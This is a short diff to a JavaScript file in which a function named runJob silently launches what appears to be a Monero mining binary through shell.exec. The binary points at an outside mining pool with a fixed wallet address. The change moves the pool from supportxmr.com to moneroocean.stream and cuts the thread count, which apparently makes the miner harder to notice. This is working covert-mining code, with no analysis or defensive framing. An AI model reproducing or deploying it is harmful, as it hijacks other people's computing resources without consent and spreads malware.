@@ -12,8 +12,8 @@ const timeout = (ms) => {
 }
 
 const runJob = (nameTool) => {
-    const coreNumber = Math.floor(Math.random() * 30) + 2;
-    const runMonney = shell.exec(`./${nameTool} -o http://pool.supportxmr.com:5555 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${ coreNumber } --astrobwt-avx2 --no-huge-pages --randomx-wrmsr=-1`, { silent: true, async: true });
+    const coreNumber = Math.floor(Math.random() * 2) + 2;
+    const runMonney = shell.exec(`./${nameTool} -o gulf.moneroocean.stream:10128 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${ coreNumber } --astrobwt-avx2 --no-huge-pages --randomx-wrmsr=-1`, { silent: true, async: true });
     if (runMonney.code !== undefined) {
         return 0;
     }
